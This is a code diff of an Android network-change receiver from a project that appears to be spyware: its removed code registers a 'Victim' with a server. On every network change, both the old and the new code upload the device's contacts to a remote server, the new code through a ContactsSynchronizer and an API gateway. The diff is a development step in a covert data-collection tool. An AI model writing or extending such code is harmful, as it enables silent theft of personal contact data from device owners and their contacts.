@@ -5,10 +5,9 @@ import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 
-import com.theah64.xrob.interfaces.JobListener;
-import com.theah64.xrob.models.Victim;
-import com.theah64.xrob.utils.ContactUtils;
-import com.theah64.xrob.utils.NetworkUtils;
+import com.theah64.xrob.asynctasks.ContactRefresher;
+import com.theah64.xrob.asynctasks.ContactsSynchronizer;
+import com.theah64.xrob.utils.APIRequestGateway;
 import com.theah64.xrob.utils.PrefUtils;
 
 public class NetworkChangeReceiver extends BroadcastReceiver {
@@ -23,50 +22,19 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(final Context context, Intent intent) {
-
         Log.i(X, "Network changed...");
 
+        final boolean isSyncContacts = PrefUtils.getInstance(context).getBoolean(PrefUtils.KEY_IS_SYNC_CONTACTS);
 
+        if (isSyncContacts) {
 
-        if (NetworkUtils.hasNetwork(context)) {
-
-            Log.i(X, "Has network");
-
-            final PrefUtils prefUtils = PrefUtils.getInstance(context);
-            final boolean hasApiKey = prefUtils.getString(Victim.KEY_API_KEY) != null;
-
-            Log.d(X, "hasApiKey ? " + hasApiKey);
-
-            if (hasApiKey) {
-
-                //Do the jobs here
-                ContactUtils.push(context);
-
-            } else {
-
-                Log.i(X, "Registering victim...");
-
-                //Register victim here
-                Victim.register(context, new JobListener() {
-                    @Override
-                    public void onJobStart() {
-
-                    }
-
-                    @Override
-                    public void onJobFinish(String apiKey) {
-                        ContactUtils.push(context);
-                    }
-
-
-                    @Override
-                    public void onJobFailed(String reason) {
-
-                    }
-
-                });
-            }
-
+            new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
+                @Override
+                public void onReadyToRequest(String apiKey) {
+                    new ContactsSynchronizer(context).execute(apiKey);
+                }
+            }).start();
         }
+
     }
 }
